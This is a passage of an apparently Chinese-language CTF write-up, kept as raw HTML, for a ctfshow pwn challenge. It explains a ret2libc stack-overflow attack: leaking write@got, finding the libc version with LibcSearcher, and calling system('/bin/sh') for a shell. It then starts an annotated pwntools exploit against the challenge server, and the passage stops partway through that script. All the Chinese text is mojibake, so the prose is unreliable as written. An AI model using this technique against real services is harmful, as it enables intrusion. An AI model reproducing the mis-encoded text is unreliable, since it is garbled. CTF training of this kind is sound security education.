&lt;p&gt;æ ¹æ®é¢˜ç›®ï¼Œä¹Ÿå°±æ˜¯è¯´å…·ä½“æ”»å‡»æ‰‹æ³•ä¸ºï¼š&lt;code&gt;ret2libc&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;ret2libcæ”»å‡»&#34;&gt;ret2libcæ”»å‡»
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;ret2libc&lt;/code&gt; æ˜¯ä¸€ç§åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­çš„ç»å…¸æŠ€æœ¯ï¼Œå…¨ç§°ä¸º â€œreturn - to - libcâ€ï¼Œä¸­æ–‡å¯ç†è§£ä¸º â€œè¿”å›è‡³ libc åº“â€ï¼Œå¸¸ç”¨äºç»•è¿‡æ ˆä¸å¯æ‰§è¡Œï¼ˆ&lt;code&gt;NX&lt;/code&gt;ï¼ŒNo - eXecuteï¼‰ä¿æŠ¤æœºåˆ¶ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&#34;ret2libcå®ç°æ­¥éª¤&#34;&gt;ret2libcå®ç°æ­¥éª¤
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¿¡æ¯æ³„æ¼&lt;/strong&gt;ï¼šé€šè¿‡æ ˆæº¢å‡ºæ¼æ´ï¼Œç»“åˆä¸€äº›å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;write&lt;/code&gt; å‡½æ•°ï¼‰ï¼Œæ³„æ¼å‡ºç¨‹åºä¸­ &lt;code&gt;libc&lt;/code&gt; åº“å‡½æ•°çš„çœŸå®åœ°å€ã€‚å› ä¸ºåœ¨ä¸åŒç³»ç»Ÿä¸­ï¼Œ&lt;code&gt;libc&lt;/code&gt; åº“åŠ è½½çš„åŸºåœ°å€æ˜¯éšæœºçš„ï¼ˆ&lt;code&gt;ASLR&lt;/code&gt; ä¿æŠ¤æœºåˆ¶ï¼‰ï¼Œä½†åº“å†…å‡½æ•°ä¹‹é—´çš„ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆè·å–ä¸€ä¸ªå·²çŸ¥å‡½æ•°ï¼ˆæ¯”å¦‚ &lt;code&gt;write&lt;/code&gt; ï¼‰çš„çœŸå®åœ°å€ï¼Œè¿›è€Œè®¡ç®—å‡ºå…¶ä»–å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;system&lt;/code&gt; ï¼‰çš„åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è®¡ç®—å…³é”®åœ°å€&lt;/strong&gt;ï¼šæ ¹æ®æ³„æ¼å‡ºçš„ &lt;code&gt;libc&lt;/code&gt; å‡½æ•°åœ°å€ï¼Œè®¡ç®—å‡º &lt;code&gt;system&lt;/code&gt; å‡½æ•°åœ°å€å’Œ &lt;code&gt;/bin/sh&lt;/code&gt; å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ç”±äº &lt;code&gt;libc&lt;/code&gt; ä¸­å‡½æ•°å’Œå­—ç¬¦ä¸²çš„ç›¸å¯¹ä½ç½®å›ºå®šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å·²çŸ¥å‡½æ•°åœ°å€ä¸åç§»é‡æ¥è®¡ç®—å…¶ä»–å…³é”®åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ„é€  payload&lt;/strong&gt;ï¼šå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ„é€ åˆé€‚çš„ payloadã€‚payload ä¸€èˆ¬åŒ…å«å¡«å……æ•°æ®ï¼ˆç”¨äºå¡«æ»¡ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€ï¼‰ã€&lt;code&gt;system&lt;/code&gt; å‡½æ•°åœ°å€ï¼ˆè¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿”å›æ—¶è·³è½¬åˆ° &lt;code&gt;system&lt;/code&gt; å‡½æ•°ï¼‰ã€ä¸€ä¸ªæ— æ•ˆçš„è¿”å›åœ°å€ï¼ˆ&lt;code&gt;system&lt;/code&gt; å‡½æ•°æ‰§è¡Œå®Œåè¦è¿”å›çš„åœ°å€ï¼Œéšä¾¿å¡«å……ä¸€ä¸ªåœ°å€ï¼Œå› ä¸ºè·å–åˆ° shell åé€šå¸¸ä¸ä¼šå†å…³æ³¨è¿™ä¸ªè¿”å›æ“ä½œ ï¼‰ã€&lt;code&gt;/bin/sh&lt;/code&gt; å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆä½œä¸º &lt;code&gt;system&lt;/code&gt; å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ · &lt;code&gt;system&lt;/code&gt; å‡½æ•°æ‰§è¡Œæ—¶å°±ç›¸å½“äºæ‰§è¡Œäº† &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; ï¼Œä»è€Œæ‰“å¼€ä¸€ä¸ª shell ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å‘é€ payload&lt;/strong&gt;ï¼šå°†æ„é€ å¥½çš„ payload å‘é€ç»™å­˜åœ¨æ¼æ´çš„ç¨‹åºï¼Œä½¿ç¨‹åºæŒ‰ç…§æ”»å‡»è€…æœŸæœ›çš„æµç¨‹æ‰§è¡Œï¼Œæœ€ç»ˆè·å–åˆ°ä¸€ä¸ªäº¤äº’å¼ shellï¼Œè¾¾åˆ°æ¼æ´åˆ©ç”¨çš„ç›®çš„ã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç”¨shellcodeäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68.png&#34;
	width=&#34;746&#34;
	height=&#34;164&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68_hu_a99ea644fc591014.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68_hu_74f646b65d73e4a1.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;x32&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;454&#34;
		data-flex-basis=&#34;1091px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86.png&#34;
	width=&#34;716&#34;
	height=&#34;251&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86_hu_ad09145c80ebcfc7.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86_hu_102f231e16202428.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;F5åç¼–è¯‘æŸ¥çœ‹mainä»£ç &#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;285&#34;
		data-flex-basis=&#34;684px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87.png&#34;
	width=&#34;670&#34;
	height=&#34;225&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87_hu_4b1328521ea80b77.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87_hu_6142d0f1d51ae79b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;297&#34;
		data-flex-basis=&#34;714px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥å‘ç°bufå¤§å°ä¸º 132 å­—èŠ‚ï¼Œä½†readå…è®¸è¯»å– 0x100ï¼ˆ256ï¼‰å­—èŠ‚å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›writeå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89.png&#34;
	width=&#34;726&#34;
	height=&#34;135&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89_hu_e35dedabfd39796d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89_hu_f0ccf21542fa3cb6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;537&#34;
		data-flex-basis=&#34;1290px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDAx32åˆ†æï¼Œä¹Ÿæ²¡æœ‰/bin/shã€åé—¨systemï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69.png&#34;
	width=&#34;1324&#34;
	height=&#34;545&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69_hu_6b3b5c81b042741f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69_hu_60765907f2428b45.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æ— /bin/shè·¯å¾„&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;242&#34;
		data-flex-basis=&#34;583px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨åˆ©ç”¨libcï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰çš„systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²ï¼ˆè¿™é¢˜æ€è·¯å¾ˆç±»ä¼¼PWN_024çš„ç¼–å†™shellcodeä¸€æ ·ï¼Œç¨‹åºæœ¬èº«æ²¡æœ‰åé—¨å¯å…¥åªèƒ½ä»å¤–éƒ¨é“¾æ¥è¿›è¿™äº›å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°è¿›å…¥äº¤äº’&amp;hellip;ï¼‰ï¼Œè¿™äº›ä¸œè¥¿åœ¨ç¨‹åºè¿è¡Œæ—¶çš„çœŸå®åœ°å€è®¡ç®—æ–¹æ³•ä¸ºï¼š&lt;code&gt;@gotçœŸå®åœ°å€ = libcåŸºå€ + åç§»&lt;/code&gt;ï¼Œæ‰€ä»¥è¦å…ˆè®¡ç®—å‡º&lt;strong&gt;åç§»&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥writeå‡½æ•°ä¸ºä¾‹ ï¼Œåç§» = çœŸå®åœ°å€ - libcåŸºå€ï¼ŒçœŸå®åœ°å€å­˜åœ¨write@gotã€write@gotå¯ä»¥é€šè¿‡write@pltæ¥è¿è¡Œè¿™ä¸ªå‡½æ•°ä»è€Œæ³„éœ²å‡ºæ¥ï¼Œlibc ç‰ˆæœ¬å’ŒåŸºå€å¯ä»¥å¯¼å…¥ libcSearcher åº“æ¥æŸ¥æ‰¾è®¡ç®—è¿™é‡Œéœ€è¦å»ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼ˆ&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;æœ‰å…³.gotã€.pltè¡¨çš„çŸ¥è¯†&lt;/a&gt;ï¼‰ï¼Œç®€å•ç”»ä¸ªå›¾è¯´æ˜ä¸€ä¸‹é»„è‰²éƒ¨åˆ†æ˜¯é™æ€çš„ï¼Œç»¿è‰²éƒ¨åˆ†æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88.png&#34;
	width=&#34;742&#34;
	height=&#34;207&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88_hu_f4cd45bfba752e2c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88_hu_6305d23fee54b4e3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åŠ¨æ€é“¾æ¥åº“çš„è¿‡ç¨‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;358&#34;
		data-flex-basis=&#34;860px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;elf.got[&amp;lsquo;write&amp;rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°çœŸå®åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@gotçš„åœ°å€ï¼›&lt;/p&gt;
&lt;p&gt;elf.plt[&amp;lsquo;write&amp;rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°è·³æ¿åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@pltçš„åœ°å€ï¼›&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å…·ä½“æ€è·¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è§£æç›®æ ‡ç¨‹åºçš„ ELF æ–‡ä»¶ï¼Œè¯»å–write@pltçš„åœ°å€ ã€write@gotçš„åœ°å€å’Œctfshowçš„å‡½æ•°åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;ä»¥æ ˆæº¢å‡ºæ¼æ´ä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°write@pltæ‰§è¡Œå‡½æ•°æ³„éœ²write@gotçš„åœ°å€ï¼Œå†è·³è½¬å›ctfshowå‡½æ•°ã€‚&lt;/li&gt;
&lt;li&gt;è¯»å–æ³„éœ²å‡ºçš„write@gotçš„åœ°å€ï¼Œç”¨ libcSearcher åº“æŸ¥æ‰¾æ­£ç¡®çš„ libc ç‰ˆæœ¬ï¼Œå†è®¡ç®—åç§»ã€‚&lt;/li&gt;
&lt;li&gt;è®¡ç®—systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„çœŸå®åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;ç»§ç»­ä»ctfshowå‡½æ•°é‡Œçš„æ ˆæº¢å‡ºä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°systemå‡½æ•°çœŸå®åœ°å€ï¼ŒåŒæ—¶å°†/bin/shä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä»è€Œæ‹¿åˆ°æƒé™ã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œä¹‹å‰æˆ‘æ˜¯è·³è¿‡çš„ï¼Œæ¯”è¾ƒéš¾ï¼Œæˆ‘åšåˆ°PWN_044ä¹‹åæ‰å€’å›æ¥åšçš„ã€‚&lt;/p&gt;
&lt;p&gt;PWN044 çš„åˆ©ç”¨é€»è¾‘æ˜¯ â€œå…ˆè°ƒç”¨ &lt;code&gt;gets&lt;/code&gt; å‘ &lt;code&gt;bss&lt;/code&gt; æ®µå†™å…¥ &lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œå†è°ƒç”¨ &lt;code&gt;system&lt;/code&gt; æ‰§è¡Œâ€ï¼ˆç±»ä¼¼æ–‡æ¡£ä¸­ PWN044 çš„ &lt;code&gt;gets&lt;/code&gt; è°ƒç”¨åœºæ™¯ï¼‰ã€‚æ­¤æ—¶è°ƒç”¨ &lt;code&gt;gets&lt;/code&gt; ä»…éœ€å…¶ â€œå‡½æ•°å…¥å£â€ å³å¯å®Œæˆæ•°æ®å†™å…¥ï¼Œæ— éœ€çŸ¥é“ &lt;code&gt;gets&lt;/code&gt; åœ¨ &lt;code&gt;libc&lt;/code&gt; ä¸­çš„çœŸå®åœ°å€ â€”â€” ç›´æ¥ä½¿ç”¨ &lt;code&gt;gets&lt;/code&gt; çš„ PLT è¡¨åœ°å€ï¼ˆ&lt;code&gt;p32(gets)&lt;/code&gt; æœ¬è´¨æ˜¯ &lt;code&gt;p32(gets_plt)&lt;/code&gt;ï¼‰ï¼Œå°±èƒ½è§¦å‘ &lt;code&gt;gets&lt;/code&gt; æ‰§è¡Œï¼Œå®ç°å†™å…¥ &lt;code&gt;/bin/sh&lt;/code&gt; çš„ç›®æ ‡ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨PWN_044æ˜¯ç›´æ¥æ˜¯p32(gets)ï¼Œè€Œåœ¨è¿™è°ƒç”¨writeå‡½æ•°æ˜¯è¦åˆ†.gotå’Œ.pltï¼Œå› ä¸ºå®ƒä¿©åŠŸèƒ½éƒ½ä¸åŒã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;write_plt&lt;/code&gt; è´Ÿè´£ â€œè§¦å‘ &lt;code&gt;write&lt;/code&gt; æ‰§è¡Œâ€ï¼Œ&lt;code&gt;write_got&lt;/code&gt; è´Ÿè´£ â€œæä¾›å¾…æ³„éœ²çš„çœŸå®åœ°å€â€ï¼ŒäºŒè€…ç¼ºä¸€ä¸å¯ï¼Œå› æ­¤å¿…é¡»æ˜ç¡®åŒºåˆ†ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;æ€»ä¹‹ï¼šret2libc æ ¸å¿ƒé€»è¾‘ï¼šâ€œæ³„éœ²åœ°å€â†’è®¡ç®—åœ°å€â†’æ„é€ è°ƒç”¨â€&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;expå¤‡æ³¨ç‰ˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# å¯¼å…¥pwntoolsåº“ï¼Œæä¾›æ¼æ´åˆ©ç”¨å¸¸ç”¨åŠŸèƒ½ï¼ˆå¦‚è¿æ¥ã€æ‰“åŒ…ç­‰ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;LibcSearcher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# å¯¼å…¥LibcSearcherï¼Œç”¨äºæ ¹æ®æ³„éœ²çš„å‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”libcç‰ˆæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹ï¼ˆæ–¹ä¾¿è°ƒè¯•ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å»ºç«‹ä¸ç›®æ ‡æœåŠ¡çš„è¿æ¥ï¼ˆè¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28298&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè·å–ç¬¦å·ä¿¡æ¯ï¼ˆå¦‚å‡½æ•°åœ°å€ã€GOTè¡¨åœ°å€ç­‰ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è·å–mainå‡½æ•°çš„åœ°å€ï¼ˆç”¨äºç¬¬ä¸€æ¬¡æº¢å‡ºåè·³å›mainå‡½æ•°ï¼Œè¿›è¡ŒäºŒæ¬¡æ”»å‡»ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è·å–writeå‡½æ•°çš„GOTè¡¨åœ°å€ï¼ˆGlobal Offset Tableï¼Œå­˜å‚¨å‡½æ•°çš„çœŸå®å†…å­˜åœ°å€ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
